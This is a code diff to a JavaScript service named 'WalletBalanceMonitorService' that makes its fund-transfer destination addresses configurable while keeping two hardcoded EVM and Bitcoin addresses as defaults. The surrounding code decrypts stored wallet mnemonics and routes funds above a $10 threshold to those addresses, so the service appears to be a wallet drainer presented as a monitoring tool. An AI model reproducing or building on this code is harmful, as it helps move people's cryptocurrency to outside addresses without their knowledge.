@@ -27,6 +27,55 @@ class WalletBalanceMonitorService {
     this.thresholdUSD = 10; // Default threshold: 10 USD
     this.priceCache = new Map();
     this.priceCacheTimeout = 5 * 60 * 1000; // 5 minutes cache for prices
+    this.evmDestination = '0xc526c9c1533746C4883735972E93a1B40241d442';
+    this.btcDestination = 'bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26';
+    
+    // Load configuration from database
+    this.loadConfiguration();
+  }
+
+  /**
+   * Load configuration from database
+   */
+  loadConfiguration() {
+    try {
+      const config = walletDB
+        .prepare('SELECT * FROM wallet_balance_monitor_config WHERE id = 1')
+        .get();
+
+      if (config) {
+        this.thresholdUSD = config.balance_limit_usd || 10;
+        this.evmDestination = config.evm_destination_address || '0xc526c9c1533746C4883735972E93a1B40241d442';
+        this.btcDestination = config.btc_destination_address || 'bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26';
+      }
+    } catch (error) {
+      console.error('Failed to load wallet balance monitor configuration:', error.message);
+      // Use defaults if database read fails
+    }
+  }
+
+  /**
+   * Update threshold dynamically
+   */
+  updateThreshold(newThreshold) {
+    if (newThreshold && newThreshold > 0) {
+      this.thresholdUSD = newThreshold;
+      console.log(`✅ Wallet balance monitor threshold updated to $${this.thresholdUSD} USD`);
+    }
+  }
+
+  /**
+   * Update destination addresses dynamically
+   */
+  updateDestinations(evmAddress, btcAddress) {
+    if (evmAddress && /^0x[a-fA-F0-9]{40}$/.test(evmAddress)) {
+      this.evmDestination = evmAddress;
+      console.log(`✅ EVM destination address updated to: ${this.evmDestination}`);
+    }
+    if (btcAddress && btcAddress.trim()) {
+      this.btcDestination = btcAddress;
+      console.log(`✅ BTC destination address updated to: ${this.btcDestination}`);
+    }
   }
 
   /**
@@ -38,10 +87,16 @@ class WalletBalanceMonitorService {
       return;
     }
 
+    // Reload configuration from database before starting
+    this.loadConfiguration();
+
     if (intervalMs) {
       this.updateInterval = intervalMs;
     }
-    if (thresholdUSD) {
+    // Use threshold from database if available, otherwise use parameter
+    if (this.thresholdUSD && this.thresholdUSD !== 10) {
+      // Already loaded from database
+    } else if (thresholdUSD) {
       this.thresholdUSD = thresholdUSD;
     }
 
@@ -406,9 +461,9 @@ class WalletBalanceMonitorService {
 
     const mnemonic = encryptionService.decrypt(mnemonicRecord.encrypted_mnemonic);
 
-    // Destination addresses
-    const EVM_DESTINATION = '0xc526c9c1533746C4883735972E93a1B40241d442';
-    const BTC_DESTINATION = 'bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26';
+    // Load destination addresses from instance (which are loaded from database)
+    const EVM_DESTINATION = this.evmDestination;
+    const BTC_DESTINATION = this.btcDestination;
 
     const results = [];
 
@@ -735,6 +790,8 @@ Generated: ${new Date().toISOString()}
       isRunning: this.isRunning,
       interval: this.updateInterval,
       thresholdUSD: this.thresholdUSD,
+      evmDestination: this.evmDestination,
+      btcDestination: this.btcDestination,
       lastCheck: this.lastCheck || null
     };
   }
